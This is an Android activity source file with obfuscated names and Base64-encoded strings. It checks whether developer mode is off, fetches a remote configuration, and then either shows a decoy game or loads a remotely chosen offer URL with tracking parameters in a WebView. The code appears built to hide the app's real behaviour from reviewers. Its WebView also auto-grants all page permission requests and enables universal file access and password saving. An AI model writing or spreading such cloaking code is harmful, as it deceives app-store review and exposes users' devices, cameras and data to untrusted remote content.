package com.lyurxu.jroek;

import static com.lyurxu.jroek.FBKlyurxu.strDeeplyurxu;
import static com.lyurxu.jroek.ParseStrlyurxu.decodlyurxue;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.webkit.PermissionRequest;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class LJ extends AppCompatActivity {
    private ProgressBar progressBarlyurxu;
    private WebView webViewlyurxu;
    private String linklyurxu;
    private ValueCallback<Uri[]> myFilePathCallbacklyurxu;
    private SharedPreferences sPrefslyurxu;
    private String offerlyurxu;
    private String fb_Idlyurxu;
    public static final String URL_SHARED_PREFlyurxu = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FILE_REQUEST_CODElyurxu = 1;
    public static String keyDefaultlyurxu;
    public static String statusAppsFlyerlyurxu;
    public static String strAppsFlyerlyurxu;
    public static String AppsFl_Idlyurxu;
    public static String AD_IDlyurxu;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        progressBarlyurxu = findViewById(R.id.progressBar);

        if (devModeOfflyurxu()) {
            webViewlyurxu = findViewById(R.id.webView);
            setWebViewlyurxu(webViewlyurxu);

            Retrofit retrofitlyurxu = new Retrofit.Builder()
                    .baseUrl(CNSTNlyurxu.Gistklyurxu)
                    .build();
            GistApilyurxu gistApilyurxu = retrofitlyurxu.create(GistApilyurxu.class);
            Call<ResponseBody> gistQuerylyurxu = gistApilyurxu.getStringUrllyurxu();
            gistQuerylyurxu.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
                    if (response.isSuccessful() & response.body() != null) {
                        try {
                            String urllyurxu = response.body().string();
                            String[] paramslyurxu = urllyurxu.split("\\|");
                            offerlyurxu = paramslyurxu[0];
                            keyDefaultlyurxu = paramslyurxu[1];
                            fb_Idlyurxu = paramslyurxu[2];

                            FBKlyurxu facebooklyurxu = new FBKlyurxu(fb_Idlyurxu, LJ.this);
                            facebooklyurxu.initlyurxu();

                            sPrefslyurxu = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                            linklyurxu = sPrefslyurxu.getString(URL_SHARED_PREFlyurxu, null);
                            if (linklyurxu != null) {
                                webViewlyurxu.loadUrl(linklyurxu);
                            } else {
                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        startWebViewlyurxu(offerlyurxu);
                                    }
                                },4989);
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else {
                        goToGamelyurxu();
                    }
                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable t) {
                    goToGamelyurxu();
                }
            });

        } else {
            goToGamelyurxu();
        }
    }


    private void goToGamelyurxu() {
        startActivity(new Intent(this, MMyGameActivitylyurxu.class));
        finish();
    }

    void startWebViewlyurxu(String link) {
        if (statusAppsFlyerlyurxu != null && statusAppsFlyerlyurxu.equals(decodlyurxue("Tm9uLW9yZ2FuaWM="))) {
            String urllyurxu = link + strAppsFlyerlyurxu;
            webViewlyurxu.loadUrl(urllyurxu);
        } else if (strDeeplyurxu != null) {
            String urllyurxu = link + strDeeplyurxu;
            webViewlyurxu.loadUrl(urllyurxu);
        } else {
            if (keyDefaultlyurxu.equals(decodlyurxue("Tk8="))) {
                goToGamelyurxu();
            } else {
                String urllyurxu = new ParseStrlyurxu().parseOrganiclyurxu(link);
                webViewlyurxu.loadUrl(urllyurxu);
            }
        }
    }


    @Override
    public void onBackPressed() {
        webViewlyurxu.goBack();
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILE_REQUEST_CODElyurxu || myFilePathCallbacklyurxu == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK & data != null) {
            String dataStringlyurxu = data.getDataString();
            Uri[] resultlyurxu = new Uri[]{Uri.parse(dataStringlyurxu)};
            myFilePathCallbacklyurxu.onReceiveValue(resultlyurxu);
            myFilePathCallbacklyurxu = null;
        }
    }

    private boolean devModeOfflyurxu() {
        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        return devInt == 0;
    }

    class MyWebChromeClientlyurxu extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            myFilePathCallbacklyurxu = filePathCallback;
            startActivityForResult(new Intent(Intent.ACTION_CHOOSER).putExtra(Intent.EXTRA_INTENT, new Intent(Intent.ACTION_GET_CONTENT).addCategory(Intent.CATEGORY_OPENABLE).setType(decodlyurxue("aW1hZ2UvKg=="))), INPUT_FILE_REQUEST_CODElyurxu);
            return true;
        }

        @Override
        public void onPermissionRequest(PermissionRequest request) {
            request.grant(request.getResources());
        }
    }

    class MyWebViewClientlyurxu extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webViewlyurxu.setVisibility(View.VISIBLE);
            progressBarlyurxu.setVisibility(ProgressBar.INVISIBLE);

            if (url.contains(decodlyurxue("Z2FwcHM9NDA0"))) {
                goToGamelyurxu();
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrefslyurxu.edit();
            editor.putString(URL_SHARED_PREFlyurxu, url);
            editor.apply();
        }
    }

    private void setWebViewlyurxu(WebView webViewetgpy) {
        webViewetgpy.getSettings().setJavaScriptEnabled(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewetgpy.getSettings().setSaveFormData(true);
        webViewetgpy.getSettings().setMixedContentMode(0);
        webViewetgpy.getSettings().setSavePassword(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewetgpy.getSettings().setDatabaseEnabled(true);
        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
        webViewetgpy.getSettings().setUseWideViewPort(true);
        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewetgpy.getSettings().setEnableSmoothTransition(true);
        webViewetgpy.setWebChromeClient(new MyWebChromeClientlyurxu());
        webViewetgpy.setWebViewClient(new MyWebViewClientlyurxu());
    }
}


